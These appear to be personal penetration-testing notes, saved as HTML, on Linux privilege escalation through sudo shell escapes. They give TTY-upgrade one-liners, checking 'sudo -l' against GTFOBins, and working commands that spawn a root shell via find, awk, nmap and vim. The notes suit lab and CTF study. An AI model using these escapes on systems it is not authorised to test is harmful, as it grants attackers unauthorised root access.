<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Sudo shell escaping</title>
</head><body>Escilation via sudo shell escaping<br/>
<br/>
NOTE POINT<br/>
If you land ina shitty shell... 'No TTY present' and 'must be run from terminal'<br/>
<br/>
try &gt;&gt;&gt; <b>/usr/bin/script -qc /bin/bash /dev/null <br/>
</b>Thanks to https://forum.hackthebox.com/t/su-must-be-run-from-a-terminal/1458/4<br/>
<br/>
also google spawning a tty shell cheat sheet.... let supgrade them shells .... netsec is a goodin<br/>
https://rcenetsec.com/shell-spawning/<br/>
<br/>
also open with <br/>
<br/>
<b>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot; </b><br/>
<br/>
Start with <b>sudo -l</b>to see what can be run by the user as sudo without a password<br/>
<br/>
Compare your list with <b>GTFO Bins</b><br/>
<br/>
https://gtfobins.github.io/<br/>
<br/>
<img src="image.png"/><br/>
<br/>
we have vim gtfo sudfo has vim<br/>
<br/>
<img src="image 2.png"/><br/>
<br/>
<br/>
<img height="313" src="image 3.png" width="700"/><br/>
<img src="image 4.png"/><br/>
<br/>
<br/>
You can change the payload on some to get better shells<br/>
<br/>
<img src="image 5.png"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection﻿<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: sudo -l<br/>
2. From the output, notice the list of programs that can run via sudo.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type any of the following:<br/>
a. sudo find /bin -name nano -exec /bin/sh \;<br/>
b. sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'<br/>
c. echo &quot;os.execute('/bin/sh')&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse<br/>
d. sudo vim -c '!sh'<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>